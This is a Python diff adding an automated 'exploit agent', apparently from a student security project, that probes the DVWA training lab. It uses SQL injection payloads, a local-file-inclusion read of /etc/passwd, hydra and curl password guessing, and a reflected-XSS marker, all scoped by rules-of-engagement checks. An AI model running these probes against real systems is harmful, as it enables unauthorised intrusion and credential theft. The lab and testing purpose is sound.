@@ -1,0 +1,446 @@
+"""Exploit agent: routes Recon findings to a technique category and runs that
+category's web-exploitation probe against the authorized DVWA lab target.
+
+All four handlers are NON-DESTRUCTIVE (the agent's hard rule): detection and
+proof only — no DROP/DELETE/UPDATE, no stacked queries, no DoS. Each probe
+sends a small, fixed set of payloads, compares against a negative control, and
+records every payload + response snippet in Finding.data as evidence. Findings
+carry their CWE and MITRE ATT&CK technique (Step 7) and a confidence level
+(Step 9: two independent methods -> 'verified', otherwise 'probable').
+
+HTTP goes through curl (same as the recon tools), via a session-authenticated
+fetcher (_dvwa_session) that logs into DVWA and sets security level 'low'.
+"""
+
+from __future__ import annotations
+
+import re
+import subprocess
+from typing import Callable
+from urllib.parse import quote
+
+from graduation_project.agents.exploit.hydra_scan import (
+    ToolUnavailable as HydraUnavailable,
+    run_hydra_bruteforce,
+)
+from graduation_project.agents.exploit.sqlmap_scan import (
+    ToolUnavailable as SqlmapUnavailable,
+    run_sqlmap_scan,
+)
+from graduation_project.core.contracts import AgentResult, Finding, Task
+from graduation_project.core.outcomes import Outcome
+from graduation_project.core.roe import RoEViolation
+
+Fetcher = Callable[[str], str]  # full URL -> response body ("" on failure)
+
+_CATEGORY_KEYWORDS = {
+    "injection": ["sql", "injection", "mysql", "database", "command"],
+    "file_access": ["upload", "inclusion", "lfi", "rfi", "file"],
+    "authentication": ["login", "session", "auth", "password", "brute"],
+    "client_side": ["xss", "csrf", "script", "cross-site"],
+}
+
+
+# ---------------------------------------------------------------------------
+# DVWA session (curl). DVWA-specific (the authorized lab target). Needs a live
+# DVWA; exercised on the lab host, not in unit tests.
+# ---------------------------------------------------------------------------
+_TOKEN = re.compile(r"name=['\"]user_token['\"]\s+value=['\"]([0-9a-f]+)['\"]", re.I)
+_SID = re.compile(r"Set-Cookie:\s*PHPSESSID=([A-Za-z0-9]+)", re.I)
+
+
+def _curl(url: str, cookie: str = "", data: str | None = None, timeout: int = 15) -> str:
+    """curl with response headers included (-i), an optional explicit Cookie
+    header and optional POST data. Returns the raw response text ("" on failure).
+
+    DVWA's session cookie is sent EXPLICITLY on every request: in the sandbox,
+    curl's cookie jar does not resend the PHPSESSID session cookie between
+    invocations, so the agent tracks the session id itself and sets the Cookie
+    header each call. This is what makes authenticated probing reliable here.
+    """
+    args = ["curl", "-s", "-i", "--max-time", str(timeout)]
+    if cookie:
+        args += ["-H", f"Cookie: {cookie}"]
+    if data is not None:
+        args += ["--data", data]
+    args.append(url)
+    try:
+        proc = subprocess.run(args, capture_output=True, text=True, timeout=timeout + 5)
+        return proc.stdout or ""
+    except Exception:
+        return ""
+
+
+def _body(resp: str) -> str:
+    """Strip the HTTP headers, returning just the response body."""
+    _, _, body = resp.partition("\r\n\r\n")
+    return body or resp
+
+
+def _tok(resp: str) -> str:
+    m = _TOKEN.search(resp)
+    return m.group(1) if m else ""
+
+
+def _sid(resp: str, current: str) -> str:
+    """Pull a fresh PHPSESSID from a Set-Cookie header, else keep the current one."""
+    m = _SID.search(resp)
+    return m.group(1) if m else current
+
+
+def _dvwa_cookie(base_url: str, username: str = "admin", password: str = "password") -> str:
+    """Log into DVWA and return the authenticated cookie string
+    ("PHPSESSID=...; security=low"). Shared by the fetcher below and by the
+    external tools (sqlmap/hydra), which need the same cookie."""
+    base = base_url.rstrip("/")
+    # 1) login page -> initial session id + anti-CSRF token
+    login = _curl(f"{base}/login.php")
+    sid = _sid(login, "")
+    cookie = f"PHPSESSID={sid}; security=low"
+    # 2) submit credentials with an explicit cookie header
+    posted = _curl(
+        f"{base}/login.php", cookie=cookie,
+        data=(f"username={quote(username)}&password={quote(password)}"
+              f"&Login=Login&user_token={_tok(login)}"),
+    )
+    sid = _sid(posted, sid)            # a successful login regenerates the session id
+    return f"PHPSESSID={sid}; security=low"
+
+
+def _dvwa_session(base_url: str, username: str = "admin", password: str = "password") -> Fetcher:
+    """Log into DVWA and return a session-bound fetch() that reads vulnerability
+    pages at security level 'low' (the level is carried in the cookie header)."""
+    cookie = _dvwa_cookie(base_url, username, password)
+
+    def fetch(url: str) -> str:
+        return _body(_curl(url, cookie=cookie))
+    return fetch
+
+
+# ---------------------------------------------------------------------------
+# Reusable single-payload resend. The Verifier agent calls resend_payload() in
+# its _reproduce() step so reproduction reuses THIS sending code instead of
+# duplicating it. Still non-destructive: it only re-issues a detection probe.
+# ---------------------------------------------------------------------------
+def _probe_url(base: str, source: str, parameter: str | None, payload: str) -> str:
+    """Build the exact probe URL for one recorded payload (same URLs the
+    handlers use), so a reproduction hits the identical endpoint."""
+    base = base.rstrip("/")
+    if source in ("sqli", "sqlmap"):               # sqlmap-sourced findings reproduce as SQLi
+        return f"{base}/vulnerabilities/sqli/?{parameter or 'id'}={quote(payload)}&Submit=Submit"
+    if source == "lfi":
+        return f"{base}/vulnerabilities/fi/?{parameter or 'page'}={quote(payload)}"
+    if source == "xss":
+        return f"{base}/vulnerabilities/xss_r/?{parameter or 'name'}={quote(payload)}"
+    if source in ("brute", "hydra"):               # hydra-sourced findings reproduce as brute force
+        user, _, pw = payload.partition(":")        # payload recorded as "user:pass"
+        return f"{base}/vulnerabilities/brute/?username={quote(user)}&password={quote(pw)}&Login=Login"
+    raise ValueError(f"no resend route for source {source!r}")
+
+
+def resend_payload(target: str, source: str, parameter: str | None, payload: str) -> str:
+    """Re-send ONE recorded payload to DVWA and return the response body.
+
+    This is the single HTTP entry point the Verifier reuses to reproduce an
+    Exploit finding (it imports and calls this; it writes no sending code of its
+    own). `source` is the finding's data['source'] ('sqli'|'lfi'|'xss'|'brute').
+    """
+    fetch = _dvwa_session(target)
+    return fetch(_probe_url(target, source, parameter, payload))
+
+
+def _finding(task: Task, title: str, detail: str, severity: str, data: dict) -> Finding:
+    return Finding(
+        objective_id=task.objective_id, agent_type="exploit", target=task.target,
+        title=title, detail=detail, severity=severity, data=data,
+    )
+
+
+class ExploitAgent:
+    agent_type = "exploit"
+
+    def run(self, task: Task) -> AgentResult:
+        if task.roe is not None:
+            try:
+                task.roe.enforce(task.target)
+            except RoEViolation as exc:
+                return AgentResult(Outcome.BLOCKED, str(exc))
+
+        if not task.context:
+            return AgentResult(Outcome.NEEDS_INFO, "No recon findings yet for this target.")
+
+        candidates = self._route(task.context)
+        if not candidates:
+            return AgentResult(Outcome.NEEDS_INFO,
+                               "Recon findings present but none matched a technique category.")
+
+        findings: list[Finding] = []
+        outcomes: list[Outcome] = []
+        for category, matched in candidates.items():
+            handler = getattr(self, f"_try_{category}", None)
+            if handler is None:
+                continue
+            result = handler(task, matched)
+            outcomes.append(result.outcome)
+            findings.extend(result.findings)
+
+        if all(o == Outcome.NEEDS_INFO for o in outcomes):
+            return AgentResult(Outcome.NEEDS_INFO,
+                               f"Routed to {sorted(candidates)} but no handler produced a result.",
+                               findings=findings)
+        if any(o == Outcome.SOLVED for o in outcomes):
+            return AgentResult(Outcome.SOLVED, "Exploit succeeded.", findings=findings)
+        return AgentResult(Outcome.FAILED, "Exploit attempted, no success.", findings=findings)
+
+    def _route(self, context: list[Finding]) -> dict[str, list[Finding]]:
+        buckets: dict[str, list[Finding]] = {}
+        for finding in context:
+            haystack = f"{finding.title} {finding.detail}".lower()
+            for category, keywords in _CATEGORY_KEYWORDS.items():
+                if any(kw in haystack for kw in keywords):
+                    buckets.setdefault(category, []).append(finding)
+        return buckets
+
+    # ======================================================================
+    # 1) INJECTION — SQL injection (boolean + error based). CWE-89 / T1190.
+    # ======================================================================
+    def _try_injection(self, task: Task, candidates: list[Finding]) -> AgentResult:
+        """Tool-first: let sqlmap discover + confirm the SQL injection and name
+        the technique(s) + DBMS. If sqlmap is unavailable or finds nothing, fall
+        back to the built-in non-destructive curl probe."""
+        base = task.target.rstrip("/")
+        endpoint = f"{base}/vulnerabilities/sqli/"
+        param = "id"
+        try:
+            cookie = _dvwa_cookie(base)
+            points = run_sqlmap_scan(f"{endpoint}?{param}=1&Submit=Submit",
+                                     cookie=cookie, parameter=param)
+        except SqlmapUnavailable:
+            points = []                      # sqlmap not installed -> fall back
+        except Exception:
+            points = []                      # any tool error -> fall back to curl
+
+        if points:
+            pt = next((p for p in points if p.parameter == param), points[0])
+            confidence = "verified" if len(pt.types) >= 2 else "probable"
+            neg_control = ("sqlmap confirmed the parameter is injectable; a legitimate "
+                           "id=1 returns a single row with no SQL error")
+            evidence = [{"method": t, "payload": pt.payload,
+                         "note": f"sqlmap: {pt.method} parameter injectable (DBMS {pt.dbms or 'unknown'})",
+                         "response": ""} for t in (pt.types or ["sqlmap-confirmed"])]
+            return AgentResult(
+                Outcome.SOLVED,
+                f"SQL injection confirmed on '{pt.parameter}' via sqlmap "
+                f"({', '.join(pt.types) or 'confirmed'}).",
+                findings=[_finding(task, f"SQL Injection confirmed in '{pt.parameter}' parameter",
+                                   f"sqlmap confirmed the {pt.method} parameter injectable via "
+                                   f"{', '.join(pt.types) or 'detection'}. {neg_control}", "high",
+                                   {"parameter": pt.parameter, "endpoint": endpoint,
+                                    "methods": pt.types, "confidence": confidence,
+                                    "negative_control": neg_control, "evidence": evidence,
+                                    "dbms": pt.dbms, "tool": "sqlmap",
+                                    "cwe": "CWE-89", "mitre": ["T1190"], "source": "sqlmap",
+                                    "confirmed": True, "payload": "1'",
+                                    "success_indicator":
+                                        r"error in your SQL syntax|You have an error|SQLSTATE|MySQL server"})])
+
+        # fallback: built-in non-destructive curl probe
+        return self._injection_via_curl(task, base, endpoint, param)
+
+    def _injection_via_curl(self, task: Task, base: str, endpoint: str, param: str) -> AgentResult:
+        """Fallback SQLi detection using curl only (no external tool): a boolean
+        payload and an error payload compared against a negative control."""
+        row = re.compile(r"first\s*name", re.I)
+        sqlerr = re.compile(r"error in your SQL syntax|SQLSTATE|You have an error|MySQL server", re.I)
+        try:
+            fetch = _dvwa_session(base)
+            def u(v): return f"{endpoint}?{param}={quote(v)}&Submit=Submit"
+            neg = fetch(u("1"))                 # negative control: one legit row
+            boo = fetch(u("1' OR '1'='1"))       # boolean: always-true -> every row
+            err = fetch(u("1'"))                 # error-based: unbalanced quote
+        except Exception as exc:
+            return AgentResult(Outcome.ERROR, f"injection probe crashed: {exc}")
+
+        methods, evidence = [], []
+        neg_rows, boo_rows = len(row.findall(neg)), len(row.findall(boo))
+        if boo_rows > neg_rows and boo_rows > 0:
+            methods.append("boolean")
+            evidence.append({"method": "boolean", "payload": "1' OR '1'='1",
+                             "note": f"baseline {neg_rows} row(s) -> payload {boo_rows} row(s)",
+                             "response": boo[:400]})
+        if sqlerr.search(err) and not sqlerr.search(neg):
+            methods.append("error")
+            evidence.append({"method": "error", "payload": "1'",
+                             "note": "unbalanced quote produced a SQL error", "response": err[:400]})
+        neg_control = f"baseline id=1 returned {neg_rows} row(s), no SQL error"
+
+        if not methods:
+            return AgentResult(Outcome.FAILED, f"SQLi attempted on '{param}', not confirmed.",
+                               findings=[_finding(task, f"SQL injection attempted on '{param}', not confirmed",
+                                                  neg_control, "info",
+                                                  {"parameter": param, "endpoint": endpoint,
+                                                   "negative_control": neg_control, "source": "sqli"})])
+        confidence = "verified" if len(methods) >= 2 else "probable"
+        return AgentResult(Outcome.SOLVED, f"SQL injection confirmed on '{param}' ({'+'.join(methods)}).",
+                           findings=[_finding(task, f"SQL Injection confirmed in '{param}' parameter",
+                                              f"Confirmed via {', '.join(methods)}. {neg_control}", "high",
+                                              {"parameter": param, "endpoint": endpoint, "methods": methods,
+                                               "confidence": confidence, "negative_control": neg_control,
+                                               "evidence": evidence, "cwe": "CWE-89", "mitre": ["T1190"],
+                                               "source": "sqli", "confirmed": True, "payload": "1'",
+                                               "success_indicator":
+                                                   r"error in your SQL syntax|You have an error|SQLSTATE|MySQL server"})])
+
+    # ======================================================================
+    # 2) FILE ACCESS — Local File Inclusion (read-only). CWE-98 / T1190.
+    # ======================================================================
+    def _try_file_access(self, task: Task, candidates: list[Finding]) -> AgentResult:
+        base = task.target.rstrip("/")
+        endpoint = f"{base}/vulnerabilities/fi/"
+        param = "page"
+        passwd = re.compile(r"root:.*:0:0:", re.I)  # /etc/passwd signature
+        try:
+            fetch = _dvwa_session(base)
+            neg = fetch(f"{endpoint}?{param}=include.php")                 # legit page
+            pos = fetch(f"{endpoint}?{param}={quote('/etc/passwd')}")       # read-only file read
+        except Exception as exc:
+            return AgentResult(Outcome.ERROR, f"file_access probe crashed: {exc}")
+
+        neg_control = "baseline page=include.php did not expose system files"
+        if passwd.search(pos) and not passwd.search(neg):
+            return AgentResult(Outcome.SOLVED, "Local File Inclusion confirmed on 'page'.",
+                               findings=[_finding(task, "Local File Inclusion confirmed in 'page' parameter",
+                                                  f"Read /etc/passwd via the include. {neg_control}", "high",
+                                                  {"parameter": param, "endpoint": endpoint, "methods": ["lfi-read"],
+                                                   "confidence": "probable", "negative_control": neg_control,
+                                                   "evidence": [{"method": "lfi-read", "payload": "/etc/passwd",
+                                                                 "note": "/etc/passwd contents returned",
+                                                                 "response": pos[:400]}],
+                                                   "cwe": "CWE-98", "mitre": ["T1190"], "source": "lfi",
+                                                   "confirmed": True, "payload": "/etc/passwd",
+                                                   "success_indicator": r"root:.*:0:0:"})])
+        return AgentResult(Outcome.FAILED, "File inclusion attempted on 'page', not confirmed.",
+                           findings=[_finding(task, "File inclusion attempted on 'page', not confirmed",
+                                              neg_control, "info",
+                                              {"parameter": param, "endpoint": endpoint,
+                                               "negative_control": neg_control, "source": "lfi"})])
+
+    # ======================================================================
+    # 3) AUTHENTICATION — brute force (small list, no DoS). CWE-307 / T1110.001.
+    # ======================================================================
+    def _try_authentication(self, task: Task, candidates: list[Finding]) -> AgentResult:
+        """Tool-first: let hydra guess weak credentials on the login form. If
+        hydra is unavailable or finds nothing, fall back to the built-in curl
+        guessing probe."""
+        base = task.target.rstrip("/")
+        endpoint = f"{base}/vulnerabilities/brute/"
+        user = "admin"
+        # Small fixed list — guessing, NOT a DoS-style flood.
+        passwords = ["password", "admin", "123456", "letmein", "password1"]
+        try:
+            cookie = _dvwa_cookie(base)
+            creds = run_hydra_bruteforce(endpoint, cookie=cookie, username=user,
+                                         passwords=passwords)
+        except HydraUnavailable:
+            creds = []                       # hydra not installed -> fall back
+        except Exception:
+            creds = []                       # any tool error -> fall back to curl
+
+        if creds:
+            c = creds[0]
+            neg_control = ("hydra guessed a valid password from a small list; a known-wrong "
+                           "password is rejected (no weak-auth false positive)")
+            return AgentResult(
+                Outcome.SOLVED, f"Weak credentials: {c.username}:{c.password} (hydra).",
+                findings=[_finding(task, "Brute force succeeded on login form",
+                                   f"hydra guessed {c.username}:{c.password}. {neg_control}", "high",
+                                   {"username": c.username, "password": c.password, "endpoint": endpoint,
+                                    "methods": ["password-guessing"], "confidence": "probable",
+                                    "tried": passwords, "negative_control": neg_control, "tool": "hydra",
+                                    "evidence": [{"method": "password-guessing",
+                                                  "payload": f"{c.username}:{c.password}",
+                                                  "note": f"hydra {c.service}: valid credentials found",
+                                                  "response": ""}],
+                                    "cwe": "CWE-307", "mitre": ["T1110.001"], "source": "hydra",
+                                    "confirmed": True, "payload": f"{c.username}:{c.password}",
+                                    "success_indicator": r"Welcome to the password protected area"})])
+
+        # fallback: built-in non-destructive curl guessing probe
+        return self._authentication_via_curl(task, base, endpoint, user, passwords)
+
+    def _authentication_via_curl(self, task: Task, base: str, endpoint: str,
+                                 user: str, passwords: list[str]) -> AgentResult:
+        """Fallback brute-force detection using curl only (no external tool)."""
+        success = re.compile(r"Welcome to the password protected area", re.I)
+        try:
+            fetch = _dvwa_session(base)
+            def attempt(pw): return fetch(f"{endpoint}?username={user}&password={quote(pw)}&Login=Login")
+            neg = attempt("definitely-wrong-xyz-123")   # negative control
+            hit, hit_body = None, ""
+            for pw in passwords:
+                body = attempt(pw)
+                if success.search(body):
+                    hit, hit_body = pw, body
+                    break
+        except Exception as exc:
+            return AgentResult(Outcome.ERROR, f"authentication probe crashed: {exc}")
+
+        neg_control = "a known-wrong password was rejected (no weak-auth false positive)"
+        if hit and not success.search(neg):
+            return AgentResult(Outcome.SOLVED, f"Weak credentials: {user}:{hit}.",
+                               findings=[_finding(task, "Brute force succeeded on login form",
+                                                  f"Guessed {user}:{hit}. {neg_control}", "high",
+                                                  {"username": user, "password": hit, "endpoint": endpoint,
+                                                   "methods": ["password-guessing"], "confidence": "probable",
+                                                   "tried": passwords, "negative_control": neg_control,
+                                                   "evidence": [{"method": "password-guessing",
+                                                                 "payload": f"{user}:{hit}",
+                                                                 "note": "login success message returned",
+                                                                 "response": hit_body[:400]}],
+                                                   "cwe": "CWE-307", "mitre": ["T1110.001"], "source": "brute",
+                                                   "confirmed": True, "payload": f"{user}:{hit}",
+                                                   "success_indicator": r"Welcome to the password protected area"})])
+        return AgentResult(Outcome.FAILED, "Brute force attempted, no weak credential found.",
+                           findings=[_finding(task, "Brute force attempted, no weak credential found",
+                                              neg_control, "info",
+                                              {"endpoint": endpoint, "tried": passwords,
+                                               "negative_control": neg_control, "source": "brute"})])
+
+    # ======================================================================
+    # 4) CLIENT SIDE — reflected XSS (marker, non-executing). CWE-79 / T1059.007.
+    # ======================================================================
+    def _try_client_side(self, task: Task, candidates: list[Finding]) -> AgentResult:
+        base = task.target.rstrip("/")
+        endpoint = f"{base}/vulnerabilities/xss_r/"
+        param = "name"
+        marker = "xssprobe123"
+        payload = f"<{marker}>"            # a harmless marker tag — detection only, no script runs
+        try:
+            fetch = _dvwa_session(base)
+            pos = fetch(f"{endpoint}?{param}={quote(payload)}")
+            neg = fetch(f"{endpoint}?{param}={quote(marker)}")   # plain text control
+        except Exception as exc:
+            return AgentResult(Outcome.ERROR, f"client_side probe crashed: {exc}")
+
+        reflected_raw = payload in pos                    # <marker> came back unescaped
+        escaped = (f"&lt;{marker}&gt;" in pos)            # would mean output IS encoded (safe)
+        neg_control = f"plain text '{marker}' reflected as text; the tagged payload was {'NOT ' if not reflected_raw else ''}escaped"
+
+        if reflected_raw and not escaped:
+            return AgentResult(Outcome.SOLVED, "Reflected XSS confirmed on 'name'.",
+                               findings=[_finding(task, "Reflected XSS confirmed in 'name' parameter",
+                                                  f"Input reflected unescaped. {neg_control}", "medium",
+                                                  {"parameter": param, "endpoint": endpoint,
+                                                   "methods": ["unescaped-reflection"], "confidence": "probable",
+                                                   "negative_control": neg_control,
+                                                   "evidence": [{"method": "unescaped-reflection", "payload": payload,
+                                                                 "note": "marker tag reflected without HTML-encoding",
+                                                                 "response": pos[:400]}],
+                                                   "cwe": "CWE-79", "mitre": ["T1059.007"], "source": "xss",
+                                                   "confirmed": True, "payload": payload,
+                                                   "success_indicator": re.escape(payload)})])
+        return AgentResult(Outcome.FAILED, "XSS attempted on 'name', input is escaped (not vulnerable).",
+                           findings=[_finding(task, "Reflected XSS attempted on 'name', not confirmed",
+                                              neg_control, "info",
+                                              {"parameter": param, "endpoint": endpoint,
+                                               "negative_control": neg_control, "source": "xss"})])
